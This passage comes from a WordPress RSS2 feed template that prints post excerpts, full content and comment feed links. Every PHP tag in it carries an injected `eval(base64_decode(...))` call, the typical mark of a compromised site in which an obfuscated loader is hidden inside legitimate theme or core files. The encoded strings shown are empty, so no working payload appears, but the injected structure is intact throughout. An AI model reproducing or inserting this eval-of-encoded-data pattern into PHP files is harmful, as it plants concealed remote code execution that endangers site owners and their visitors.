<?php	 	eval(base64_decode("")); else : ?>
		<description><![CDATA[<?php	 	eval(base64_decode("")); the_excerpt_rss() ?>]]></description>
	<?php	 	eval(base64_decode("")); if ( strlen( $post->post_content ) > 0 ) : ?>
		<content:encoded><![CDATA[<?php	 	eval(base64_decode("")); the_content_feed('rss2') ?>]]></content:encoded>
	<?php	 	eval(base64_decode("")); else : ?>
		<content:encoded><![CDATA[<?php	 	eval(base64_decode("")); the_excerpt_rss() ?>]]></content:encoded>
	<?php	 	eval(base64_decode("")); endif; ?>
<?php	 	eval(base64_decode("")); endif; ?>
		<wfw:commentRss><?php	 	eval(base64_decode("")); echo get_post_comments_feed_link(null, 'rss2'); ?></wfw:commentRss>
